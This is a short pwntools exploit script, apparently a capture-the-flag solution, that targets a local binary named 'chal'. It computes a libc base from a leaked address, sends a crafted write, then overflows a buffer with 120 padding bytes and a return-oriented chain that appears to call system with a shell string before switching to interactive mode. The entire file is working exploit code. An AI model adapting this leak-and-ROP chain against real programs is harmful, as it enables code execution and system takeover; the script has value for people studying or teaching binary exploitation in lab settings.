from pwn import *
# context.log_level ='debug'
context.arch = 'amd64'
p = process("./chal")
# gdb.attach(p)
base =  int(p.readline(),16)-0x64e10
log.warning(hex(base))
addr = 0x7ffff7fb9568-0x7ffff7dc6000+base
p.send(p64(addr)+p64(0))
rdi = 0x0000000000026b72+base
# raw_input()
ret = 0x11114a+base
p.send(b"\0"*120+flat([ret,rdi,0x1b75aa+base,0x55410+base]))
p.interactive()